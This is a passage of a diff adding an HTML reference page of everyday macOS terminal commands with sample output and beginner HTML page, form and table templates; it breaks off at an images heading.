@@ -1,0 +1,1500 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Terminal & Web Dev Reference</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+  <header class="hero">
+    <div class="hero-content">
+      <h1>Terminal & Web Dev Reference</h1>
+      <p>Find macOS terminal commands, HTML prompt examples, web development shortcuts, and Kali Linux tool references in one organized page.</p>
+
+      <div class="search-area">
+        <label for="searchInput" class="search-label">Search tool, category, or command</label>
+        <div class="search-wrap">
+          <input id="searchInput" type="search" placeholder="Search tool, category, or command..." />
+          <button id="clearSearch" type="button">Clear</button>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main class="container">
+    <section id="summary" class="summary">
+      <h2>How to use this reference</h2>
+      <p>Search to find Kali Linux commands, terminal shortcuts, HTML prompt ideas, and web dev tips quickly. Keep this page handy as a compact developer reference.</p>
+    </section>
+
+    <section id="extraSection" class="summary">
+      <h2>Quick Reference</h2>
+      <p>Terminal commands, HTML prompt examples, and web developer shortcuts all in one place.</p>
+
+      <div class="tool-grid">
+        <article class="tool-card">
+          <h3>MacBook Terminal Commands</h3>
+
+          <div class="example">
+            <h4>Navigation &amp; Directory Management</h4>
+            <p><strong>What they do:</strong> Move around the file system and manage folders.</p>
+            <pre><code># pwd — Print working directory (shows your current location)
+$ pwd
+/Users/umarukargbo/Documents/GitHub
+
+# ls — List files and folders in current directory
+$ ls
+cyber/  kali_linux_commands/  projects/  python_tutorial/  website/
+
+# ls -la — List all files including hidden ones with full details
+$ ls -la
+total 64
+drwxr-xr-x   5 umarukargbo  staff   160 Aug  7 10:30 .
+drwxr-xr-x  12 umarukargbo  staff   384 Aug  7 09:15 ..
+-rw-r--r--   1 umarukargbo  staff  1234 Aug  7 10:25 .gitignore
+-rw-r--r--   1 umarukargbo  staff  5678 Aug  7 09:00 README.md
+
+# cd ~/Documents — Change to Documents directory
+$ cd ~/Documents
+$ pwd
+/Users/umarukargbo/Documents
+
+# mkdir -p projects/web/src — Create nested folders
+$ mkdir -p projects/web/src
+$ ls projects/
+web/
+
+# pushd /path — Save current location and change directory
+$ pushd /Applications
+/Applications /Users/umarukargbo/Documents
+
+# popd — Return to previous saved directory
+$ popd
+/Users/umarukargbo/Documents</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>File Operations &amp; Management</h4>
+            <p><strong>What they do:</strong> Create, view, copy, move, and delete files.</p>
+            <pre><code># touch — Create empty file
+$ touch newfile.txt
+$ ls
+newfile.txt
+
+# cat — Display file contents
+$ cat README.md
+# My Project
+This is a sample readme file.
+
+# cat file1 file2 — Combine and display multiple files
+$ cat part1.txt part2.txt
+Contents of part1
+Contents of part2
+
+# head -n 5 — Show first 5 lines of file
+$ head -n 5 logfile.txt
+2026-08-07 09:00:01 - Server started
+2026-08-07 09:00:02 - Connected to database
+2026-08-07 09:00:03 - Loaded configuration
+
+# tail -f — Follow log file in real-time
+$ tail -f server.log
+2026-08-07 10:45:23 - Request received
+2026-08-07 10:45:24 - Processing...
+(new lines appear as they're written)
+
+# cp file.txt file-copy.txt — Copy file with new name
+$ cp script.js script-backup.js
+$ ls
+script.js  script-backup.js
+
+# mv old.txt new.txt — Rename or move file
+$ mv old-filename.js new-filename.js
+$ ls
+new-filename.js
+
+# rm file.txt — Delete file (cannot be undone!)
+$ rm tempfile.txt
+$ ls
+(tempfile.txt is gone)</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>Search &amp; Find Commands</h4>
+            <p><strong>What they do:</strong> Search for files and content within files.</p>
+            <pre><code># find . -name "*.js" — Find all .js files in directory
+$ find . -name "*.js"
+./src/main.js
+./src/utils/helpers.js
+./tests/app.test.js
+
+# find . -type f -name "index.*" — Find specific files by type
+$ find . -type f -name "index.*"
+./public/index.html
+./src/index.js
+
+# grep "search-term" file.txt — Search for text in file
+$ grep "export" package.json
+"exports": {
+"export default App"
+
+# grep -r "term" . — Recursive search in all files
+$ grep -r "function" src/
+src/app.js:function handleClick() {
+src/utils.js:function formatDate(date) {
+src/components/Header.js:function renderHeader() {
+
+# which node — Find full path to executable
+$ which node
+/usr/local/bin/node
+
+# grep -i "TERM" file.txt — Case-insensitive search
+$ grep -i "error" logfile.txt
+ERROR: Connection failed
+Error: Timeout occurred
+error: invalid input</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>File Permissions &amp; Ownership</h4>
+            <p><strong>What they do:</strong> Control who can read, write, and execute files.</p>
+            <pre><code># chmod 755 script.sh — Make script executable
+$ chmod 755 deploy.sh
+$ ls -l deploy.sh
+-rwxr-xr-x  1 umarukargbo  staff  1234 Aug  7 10:30 deploy.sh
+
+# chmod +x script.sh — Add execute permission
+$ chmod +x build.sh
+$ ls -l build.sh
+-rwxr-xr-x  1 umarukargbo  staff  567 Aug  7 09:15 build.sh
+
+# ls -l — View current permissions
+$ ls -l
+-rw-r--r--  1 umarukargbo  staff  1234 Aug  7 README.md
+-rwxr-xr-x  1 umarukargbo  staff  567 Aug  7 script.sh
+drwxr-xr-x  5 umarukargbo  staff  160 Aug  7 src/
+
+# Permissions breakdown: -rwxr-xr-x
+# - = file type (d = directory)
+# rwx = owner permissions (read, write, execute)
+# r-x = group permissions
+# r-x = others permissions</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>Text Processing &amp; Data Manipulation</h4>
+            <p><strong>What they do:</strong> Search, replace, and process text data.</p>
+            <pre><code># grep "term" file.txt — Find lines containing text
+$ grep "TODO" code.js
+// TODO: Fix this bug
+// TODO: Refactor this function
+
+# sed 's/old/new/g' file.txt — Replace text globally
+$ sed 's/localhost/example.com/g' config.txt
+Original: server: localhost:3000
+Result:   server: example.com:3000
+
+# sort file.txt — Sort lines alphabetically
+$ sort names.txt
+Alice
+Bob
+Charlie
+
+# wc -l file.txt — Count lines in file
+$ wc -l script.js
+47 script.js
+
+# wc -w — Count words
+$ wc -w article.txt
+1250 article.txt
+
+# awk '{print $1}' file.txt — Extract specific columns
+$ awk '{print $1}' users.txt
+John
+Jane
+Bob</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>Git Version Control</h4>
+            <p><strong>What they do:</strong> Track code changes and collaborate with others.</p>
+            <pre><code># git init — Start new repository
+$ git init
+Initialized empty Git repository in /Users/umarukargbo/Documents/myproject/.git/
+
+# git status — Check current state
+$ git status
+On branch main
+Changes not staged for commit:
+  modified:   index.js
+  modified:   styles.css
+
+Untracked files:
+  new-file.txt
+
+# git add . — Stage all changes
+$ git add .
+$ git status
+On branch main
+Changes to be committed:
+  new file:   new-file.txt
+  modified:   index.js
+
+# git commit -m "message" — Save changes with message
+$ git commit -m "Add new feature"
+[main 5a7f8e2] Add new feature
+ 2 files changed, 15 insertions(+), 5 deletions(-)
+
+# git log --oneline — View recent commits
+$ git log --oneline
+5a7f8e2 Add new feature
+3c9b1a4 Fix styling bug
+2e8d6f1 Initial commit
+
+# git push — Send commits to remote
+$ git push
+Enumerating objects: 5, done.
+Counting objects: 100% (5/5), done.
+
+# git pull — Get latest changes from remote
+$ git pull
+Updating abc123..def456
+Fast-forward
+ file.js | 10 +++++++---
+ 1 file changed, 7 insertions(+), 3 deletions(-)</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>Package Managers (Homebrew &amp; npm)</h4>
+            <p><strong>What they do:</strong> Install and manage software packages and dependencies.</p>
+            <pre><code># brew install node — Install software via Homebrew
+$ brew install node
+==> Downloading https://homebrew.bintray.com/bottles/node-16.13.0.big_sur.bottle.tar.gz
+==> Pouring node-16.13.0.big_sur.bottle.tar.gz
+🍺  /usr/local/Cellar/node/16.13.0: 3,825 files, 60.5MB
+
+# brew list — Show installed packages
+$ brew list
+git           mysql         node
+openssl       python@3.9    redis
+
+# npm install — Install project dependencies
+$ npm install
+npm notice created a lockfile as package-lock.json
+added 256 packages from 89 contributors
+audited 256 packages in 3.456s
+
+# npm install -g package — Install globally
+$ npm install -g typescript
+added 24 packages, and audited 25 packages in 2s
+
+# npm update — Update packages to latest versions
+$ npm update
+added 5 packages, removed 2 packages, and audited 256 packages in 4.235s
+
+# npm list — Show installed packages
+$ npm list
+my-project@1.0.0
+├── express@4.17.1
+├── react@17.0.2
+└── webpack@5.4.0</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>System Information &amp; Process Management</h4>
+            <p><strong>What they do:</strong> Monitor system resources and manage running processes.</p>
+            <pre><code># ps aux — List all running processes
+$ ps aux
+USER     PID  %CPU %MEM      VSZ     RSS TTY STAT TIME COMMAND
+umaruk   123  0.5  1.2  4567890  123456 ??  S    0:15 /usr/local/bin/node
+root     456  2.3  3.4  2345678  234567 ??  S    1:23 /System/Library/PrivateFrameworks
+
+# ps aux | grep node — Find specific process
+$ ps aux | grep node
+umaruk   1234  0.5  1.2  4567890  123456 ??  S    0:15 /usr/local/bin/node
+
+# kill 1234 — Terminate process by PID
+$ kill 1234
+Terminated
+
+# df -h — Show disk space usage
+$ df -h
+Filesystem     Size   Used  Avail Capacity Mounted on
+/dev/disk1s5  233Gi  198Gi   30Gi    87%   /
+/dev/disk1s1  233Gi  3.0Gi    30Gi     9%   /System/Volumes/Data
+
+# uname -a — Show system info
+$ uname -a
+Darwin MBP.local 20.6.0 Darwin Kernel Version 20.6.0 x86_64
+
+# top — View live CPU/memory usage
+$ top
+(shows interactive process monitor - press q to exit)</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>Networking &amp; Web Commands</h4>
+            <p><strong>What they do:</strong> Test connectivity, make HTTP requests, and manage network settings.</p>
+            <pre><code># ping google.com — Test host connectivity
+$ ping -c 4 google.com
+PING google.com (142.251.41.14): 56 data bytes
+64 bytes from 142.251.41.14: icmp_seq=0 ttl=118 time=23.456 ms
+64 bytes from 142.251.41.14: icmp_seq=1 ttl=118 time=21.234 ms
+4 packets transmitted, 4 packets received, 0.0% packet loss
+
+# ifconfig — Show network interfaces and IP addresses
+$ ifconfig
+en0: flags=8863 mtu 1500
+  inet 192.168.1.50 netmask 0xffffff00 broadcast 192.168.1.255
+  ether a4:5e:60:e1:23:45
+
+# curl https://api.example.com — Fetch content from URL
+$ curl https://api.example.com/users
+[{"id":1,"name":"John"},{"id":2,"name":"Jane"}]
+
+# curl -I — Fetch only HTTP headers
+$ curl -I https://example.com
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 5234
+Date: Mon, 07 Aug 2026 10:30:00 GMT
+
+# ssh user@hostname — Connect to remote server
+$ ssh deploy@server.example.com
+Last login: Mon Aug 7 09:15:23 2026 from 192.168.1.50
+user@server:~$</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>Utilities &amp; Development Tools</h4>
+            <p><strong>What they do:</strong> Open applications, manage environment, and run development servers.</p>
+            <pre><code># code . — Open current folder in VS Code
+$ code .
+(VS Code opens with current folder loaded)
+
+# open . — Open folder in Finder
+$ open .
+(Finder window opens showing current directory)
+
+# echo "text" — Print text to terminal
+$ echo "Hello World"
+Hello World
+
+# echo "text" > file.txt — Write text to file (overwrites)
+$ echo "Config data" > config.json
+$ cat config.json
+Config data
+
+# echo "text" >> file.txt — Append text to file
+$ echo "New line" >> logfile.txt
+$ cat logfile.txt
+Old content
+New line
+
+# python3 -m http.server 8000 — Start simple web server
+$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+GET / HTTP/1.1" 200 -
+(Visit http://localhost:8000 in browser)
+
+# node -v — Check Node.js version
+$ node -v
+v16.13.0
+
+# npm -v — Check npm version
+$ npm -v
+7.24.2
+
+# date — Show current date and time
+$ date
+Mon Aug  7 10:45:30 PDT 2026
+
+# history | grep git — Find specific command in history
+$ history | grep git
+  123  git status
+  124  git add .
+  125  git commit -m "Fix bug"</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>Compression &amp; Archives</h4>
+            <p><strong>What they do:</strong> Compress files and create backups.</p>
+            <pre><code># zip -r archive.zip folder/ — Create zip archive
+$ zip -r backup.zip src/
+  adding: src/ (stored 0%)
+  adding: src/index.js (deflated 35%)
+  adding: src/utils.js (deflated 42%)
+Total 3 files, 4.5 KB compressed
+
+# unzip archive.zip — Extract zip file
+$ unzip backup.zip
+Archive:  backup.zip
+  inflating: src/index.js
+  inflating: src/utils.js
+
+# tar -czf archive.tar.gz folder/ — Create compressed tar archive
+$ tar -czf project-backup.tar.gz src/
+$ ls -lh project-backup.tar.gz
+-rw-r--r--  1 umaruk  staff  2.3K Aug  7 project-backup.tar.gz
+
+# tar -xzf archive.tar.gz — Extract tar.gz file
+$ tar -xzf project-backup.tar.gz
+(files extracted)
+
+# gzip file.txt — Compress single file
+$ gzip large-file.txt
+$ ls
+large-file.txt.gz
+
+# gunzip file.txt.gz — Decompress gzip file
+$ gunzip large-file.txt.gz
+$ ls
+large-file.txt</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>Admin &amp; Permissions</h4>
+            <p><strong>What they do:</strong> Run privileged commands and manage user permissions.</p>
+            <pre><code># sudo command — Run with admin privileges
+$ sudo nano /etc/hosts
+Password: ••••••••
+(opens file editor with admin access)
+
+# whoami — Show current logged-in user
+$ whoami
+umarukargbo
+
+# sudo -i — Switch to root/admin user
+$ sudo -i
+Password: ••••••••
+root# pwd
+/var/root
+
+# chmod 755 file.sh — Set permissions (owner rwx, others r-x)
+$ chmod 755 deploy.sh
+$ ls -l deploy.sh
+-rwxr-xr-x  1 umaruk  staff  1234 Aug  7 deploy.sh
+
+# chown user:group file — Change file owner
+$ sudo chown umaruk:staff config.json
+$ ls -l config.json
+-rw-r--r--  1 umaruk  staff  567 Aug  7 config.json</code></pre>
+          </div>
+        </article>
+
+        <article class="tool-card">
+          <h3>HTML Tag Examples</h3>
+
+          <div class="example">
+            <h4>1) Minimal runnable page</h4>
+            <p>Save as <code>minimal.html</code> and open in your browser.</p>
+            <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+  &lt;head&gt;
+    &lt;meta charset="utf-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;title&gt;Minimal Page&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;header&gt;&lt;h1&gt;Hello, world!&lt;/h1&gt;&lt;/header&gt;
+    &lt;main&gt;
+      &lt;p&gt;This is a minimal, executable HTML file.&lt;/p&gt;
+    &lt;/main&gt;
+    &lt;footer&gt;&lt;small&gt;© Example&lt;/small&gt;&lt;/footer&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>2) Complete page with nav &amp; sections</h4>
+            <p>Save as <code>page-with-nav.html</code>. Shows semantic structure with header, nav, sections, and footer.</p>
+            <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+  &lt;head&gt;
+    &lt;meta charset="utf-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;title&gt;Complete Page&lt;/title&gt;
+    &lt;link rel="stylesheet" href="styles.css"&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;header&gt;
+      &lt;h1&gt;My Website&lt;/h1&gt;
+      &lt;nav&gt;
+        &lt;ul&gt;
+          &lt;li&gt;&lt;a href="#home"&gt;Home&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href="#about"&gt;About&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href="#contact"&gt;Contact&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/nav&gt;
+    &lt;/header&gt;
+    &lt;main&gt;
+      &lt;section id="home"&gt;
+        &lt;h2&gt;Welcome&lt;/h2&gt;
+        &lt;p&gt;This is the home section.&lt;/p&gt;
+      &lt;/section&gt;
+      &lt;section id="about"&gt;
+        &lt;h2&gt;About&lt;/h2&gt;
+        &lt;p&gt;Learn more about us here.&lt;/p&gt;
+      &lt;/section&gt;
+    &lt;/main&gt;
+    &lt;footer&gt;
+      &lt;p&gt;© 2026 My Website. All rights reserved.&lt;/p&gt;
+    &lt;/footer&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>3) Form with multiple input types</h4>
+            <p>Save as <code>form-advanced.html</code>. Demonstrates text, email, password, textarea, select, and checkbox inputs.</p>
+            <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+  &lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;Advanced Form&lt;/title&gt;&lt;/head&gt;
+  &lt;body&gt;
+    &lt;form action="/submit" method="post"&gt;
+      &lt;label for="username"&gt;Username:&lt;/label&gt;
+      &lt;input id="username" name="username" type="text" required&gt;
+      
+      &lt;label for="email"&gt;Email:&lt;/label&gt;
+      &lt;input id="email" name="email" type="email" required&gt;
+      
+      &lt;label for="password"&gt;Password:&lt;/label&gt;
+      &lt;input id="password" name="password" type="password" required&gt;
+      
+      &lt;label for="country"&gt;Country:&lt;/label&gt;
+      &lt;select id="country" name="country" required&gt;
+        &lt;option value=""&gt;Select a country&lt;/option&gt;
+        &lt;option value="us"&gt;United States&lt;/option&gt;
+        &lt;option value="uk"&gt;United Kingdom&lt;/option&gt;
+        &lt;option value="ca"&gt;Canada&lt;/option&gt;
+      &lt;/select&gt;
+      
+      &lt;label for="bio"&gt;Bio:&lt;/label&gt;
+      &lt;textarea id="bio" name="bio" rows="4" cols="50"&gt;&lt;/textarea&gt;
+      
+      &lt;label&gt;
+        &lt;input type="checkbox" name="agree" required&gt;
+        I agree to the terms
+      &lt;/label&gt;
+      
+      &lt;button type="submit"&gt;Submit&lt;/button&gt;
+      &lt;button type="reset"&gt;Clear&lt;/button&gt;
+    &lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>4) Media gallery with lists</h4>
+            <p>Save as <code>gallery.html</code>. Shows image gallery, ordered lists, and semantic article blocks.</p>
+            <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+  &lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;Gallery&lt;/title&gt;&lt;/head&gt;
+  &lt;body&gt;
+    &lt;h1&gt;Photo Gallery&lt;/h1&gt;
+    &lt;div class="gallery"&gt;
+      &lt;article&gt;
+        &lt;img src="photo1.jpg" alt="Photo 1"&gt;
+        &lt;h3&gt;Photo 1&lt;/h3&gt;
+        &lt;p&gt;Description of photo 1.&lt;/p&gt;
+      &lt;/article&gt;
+      &lt;article&gt;
+        &lt;img src="photo2.jpg" alt="Photo 2"&gt;
+        &lt;h3&gt;Photo 2&lt;/h3&gt;
+        &lt;p&gt;Description of photo 2.&lt;/p&gt;
+      &lt;/article&gt;
+    &lt;/div&gt;
+    &lt;h2&gt;Steps to upload:&lt;/h2&gt;
+    &lt;ol&gt;
+      &lt;li&gt;Click the upload button&lt;/li&gt;
+      &lt;li&gt;Select your image&lt;/li&gt;
+      &lt;li&gt;Add a title and description&lt;/li&gt;
+      &lt;li&gt;Click save&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>5) Embedded content &amp; iframes</h4>
+            <p>Save as <code>embedded.html</code>. Shows how to embed video, audio, and iframes.</p>
+            <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+  &lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;Embedded Media&lt;/title&gt;&lt;/head&gt;
+  &lt;body&gt;
+    &lt;h1&gt;Embedded Content&lt;/h1&gt;
+    
+    &lt;h2&gt;Video&lt;/h2&gt;
+    &lt;video width="400" controls&gt;
+      &lt;source src="video.mp4" type="video/mp4"&gt;
+      Your browser does not support the video tag.
+    &lt;/video&gt;
+    
+    &lt;h2&gt;Audio&lt;/h2&gt;
+    &lt;audio controls&gt;
+      &lt;source src="audio.mp3" type="audio/mpeg"&gt;
+      Your browser does not support audio.
+    &lt;/audio&gt;
+    
+    &lt;h2&gt;Embedded Map&lt;/h2&gt;
+    &lt;iframe src="https://www.google.com/maps/embed?..." width="400" height="300" allowfullscreen="" loading="lazy"&gt;&lt;/iframe&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>6) Data attributes &amp; semantic layout</h4>
+            <p>Save as <code>semantic.html</code>. Demonstrates data attributes and modern HTML5 semantic structure.</p>
+            <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+  &lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;Semantic&lt;/title&gt;&lt;/head&gt;
+  &lt;body&gt;
+    &lt;header role="banner"&gt;
+      &lt;h1&gt;Blog Title&lt;/h1&gt;
+    &lt;/header&gt;
+    
+    &lt;nav role="navigation"&gt;
+      &lt;ul&gt;&lt;li&gt;&lt;a href="/"&gt;Home&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
+    &lt;/nav&gt;
+    
+    &lt;main role="main"&gt;
+      &lt;article data-post-id="123" data-category="web"&gt;
+        &lt;header&gt;
+          &lt;h2&gt;Post Title&lt;/h2&gt;
+          &lt;time datetime="2026-08-07"&gt;August 7, 2026&lt;/time&gt;
+        &lt;/header&gt;
+        &lt;p&gt;Article content...&lt;/p&gt;
+      &lt;/article&gt;
+    &lt;/main&gt;
+    
+    &lt;aside role="complementary"&gt;
+      &lt;h3&gt;Related Posts&lt;/h3&gt;
+      &lt;ul&gt;&lt;li&gt;&lt;a href="#"&gt;Post 1&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
+    &lt;/aside&gt;
+    
+    &lt;footer role="contentinfo"&gt;
+      &lt;p&gt;© 2026 All rights reserved.&lt;/p&gt;
+    &lt;/footer&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>7) Tables &amp; data display</h4>
+            <p>Save as <code>table-example.html</code>. Shows proper table structure with headers and captions.</p>
+            <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+  &lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;Table&lt;/title&gt;&lt;/head&gt;
+  &lt;body&gt;
+    &lt;table&gt;
+      &lt;caption&gt;Monthly Sales Data&lt;/caption&gt;
+      &lt;thead&gt;
+        &lt;tr&gt;
+          &lt;th scope="col"&gt;Month&lt;/th&gt;
+          &lt;th scope="col"&gt;Revenue&lt;/th&gt;
+          &lt;th scope="col"&gt;Growth&lt;/th&gt;
+        &lt;/tr&gt;
+      &lt;/thead&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;January&lt;/td&gt;
+          &lt;td&gt;$50,000&lt;/td&gt;
+          &lt;td&gt;+5%&lt;/td&gt;
+        &lt;/tr&gt;
+        &lt;tr&gt;
+          &lt;td&gt;February&lt;/td&gt;
+          &lt;td&gt;$55,000&lt;/td&gt;
+          &lt;td&gt;+10%&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+          </div>
+        </article>
+
+        <article class="tool-card">
+          <h3>Writing HTML Explained</h3>
+
+          <div class="example">
+            <h4>Document structure — the foundation</h4>
+            <p><code>&lt;!DOCTYPE html&gt;</code> declares this as HTML5. <code>&lt;html&gt;</code> wraps everything. <code>&lt;head&gt;</code> holds metadata, <code>&lt;body&gt;</code> holds visible content.</p>
+            <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+  &lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;title&gt;Page Title (shown in browser tab)&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;!-- All visible content goes here --&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+            <p><strong>Why metadata matters:</strong> Character encoding ensures text displays correctly. Viewport settings make your page responsive on mobile devices.</p>
+          </div>
+
+          <div class="example">
+            <h4>Semantic HTML — accessibility &amp; SEO</h4>
+            <p>Use semantic tags like <code>&lt;header&gt;</code>, <code>&lt;nav&gt;</code>, <code>&lt;main&gt;</code>, <code>&lt;article&gt;</code>, <code>&lt;section&gt;</code>, <code>&lt;footer&gt;</code> instead of generic <code>&lt;div&gt;</code>. Screen readers and search engines understand your content better.</p>
+            <pre><code>&lt;header&gt;
+  &lt;h1&gt;Site Title&lt;/h1&gt;
+  &lt;nav&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href="/"&gt;Home&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href="/about"&gt;About&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href="/services"&gt;Services&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/nav&gt;
+&lt;/header&gt;
+
+&lt;main&gt;
+  &lt;section&gt;
+    &lt;h2&gt;Section Title&lt;/h2&gt;
+    &lt;p&gt;Content in this section...&lt;/p&gt;
+  &lt;/section&gt;
+  
+  &lt;article&gt;
+    &lt;h2&gt;Blog Post Title&lt;/h2&gt;
+    &lt;p&gt;Article content...&lt;/p&gt;
+  &lt;/article&gt;
+&lt;/main&gt;
+
+&lt;footer&gt;
+  &lt;p&gt;© 2026 Company. Contact: info@example.com&lt;/p&gt;
+&lt;/footer&gt;</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>Headings — document hierarchy</h4>
+            <p>Use exactly one <code>&lt;h1&gt;</code> for the page title. Use <code>&lt;h2&gt;</code> for major sections, <code>&lt;h3&gt;</code> for subsections, etc. Never skip heading levels.</p>
+            <pre><code>&lt;h1&gt;Main Page Title&lt;/h1&gt;
+&lt;p&gt;Introduction paragraph...&lt;/p&gt;
+
+&lt;h2&gt;First Major Section&lt;/h2&gt;
+&lt;p&gt;Content about first section...&lt;/p&gt;
+
+&lt;h3&gt;Subsection of first topic&lt;/h3&gt;
+&lt;p&gt;More detailed content...&lt;/p&gt;
+
+&lt;h2&gt;Second Major Section&lt;/h2&gt;
+&lt;p&gt;Content about second section...&lt;/p&gt;</code></pre>
+            <p><strong>Tip:</strong> Good heading structure makes content scannable and helps screen readers navigate the page.</p>
+          </div>
+
+          <div class="example">
+            <h4>Forms with accessibility</h4>
+            <p>Always pair <code>&lt;label&gt;</code> with <code>&lt;input&gt;</code> using the <code>for</code> attribute. This improves usability, especially on mobile devices and with screen readers.</p>
+            <pre><code>&lt;form action="/contact" method="post"&gt;
+  &lt;!-- Group related fields in fieldset --&gt;
+  &lt;fieldset&gt;
+    &lt;legend&gt;Personal Information&lt;/legend&gt;
+    
+    &lt;label for="fname"&gt;First Name:&lt;/label&gt;
+    &lt;input id="fname" name="firstName" type="text" required&gt;
+    
+    &lt;label for="email"&gt;Email:&lt;/label&gt;
+    &lt;input id="email" name="email" type="email" required&gt;
+  &lt;/fieldset&gt;
+  
+  &lt;fieldset&gt;
+    &lt;legend&gt;Preferences&lt;/legend&gt;
+    
+    &lt;label&gt;
+      &lt;input type="radio" name="preference" value="option1"&gt;
+      Option 1
+    &lt;/label&gt;
+    
+    &lt;label&gt;
+      &lt;input type="radio" name="preference" value="option2"&gt;
+      Option 2
+    &lt;/label&gt;
+  &lt;/fieldset&gt;
+  
+  &lt;button type="submit"&gt;Send&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>Lists — organizing content</h4>
+            <p>Use <code>&lt;ul&gt;</code> for unordered (bullet) lists and <code>&lt;ol&gt;</code> for ordered (numbered) lists. Each item goes in <code>&lt;li&gt;</code>.</p>
+            <pre><code>&lt;!-- Unordered list --&gt;
+&lt;h3&gt;Shopping List&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Milk&lt;/li&gt;
+  &lt;li&gt;Eggs&lt;/li&gt;
+  &lt;li&gt;Bread&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;!-- Ordered list with nested items --&gt;
+&lt;h3&gt;Recipe Steps&lt;/h3&gt;
+&lt;ol&gt;
+  &lt;li&gt;Preheat oven to 350°F
+    &lt;ul&gt;
+      &lt;li&gt;Check that oven is clean&lt;/li&gt;
+      &lt;li&gt;Wait 10 minutes for heating&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Mix dry ingredients&lt;/li&gt;
+  &lt;li&gt;Bake for 30 minutes&lt;/li&gt;
+&lt;/ol&gt;</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>Links and navigation</h4>
+            <p>Use <code>&lt;a href=""&gt;</code> for links. For external links, add <code>target="_blank" rel="noopener"</code> to open in a new tab safely. Use anchor links to jump within pages.</p>
+            <pre><code>&lt;!-- Simple link --&gt;
+&lt;a href="/about.html"&gt;About Us&lt;/a&gt;
+
+&lt;!-- External link (opens in new tab) --&gt;
+&lt;a href="https://www.google.com" target="_blank" rel="noopener"&gt;Visit Google&lt;/a&gt;
+
+&lt;!-- Anchor link (jump to section) --&gt;
+&lt;a href="#contact"&gt;Go to Contact Section&lt;/a&gt;
+
+&lt;!-- Link with title (tooltip) --&gt;
+&lt;a href="/" title="Return to home page"&gt;Home&lt;/a&gt;
+
+&lt;!-- Anchor target --&gt;
+&lt;section id="contact"&gt;
+  &lt;h2&gt;Contact Us&lt;/h2&gt;
+  &lt;p&gt;Email: info@example.com&lt;/p&gt;
+&lt;/section&gt;</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>Images with responsive sizing</h4>
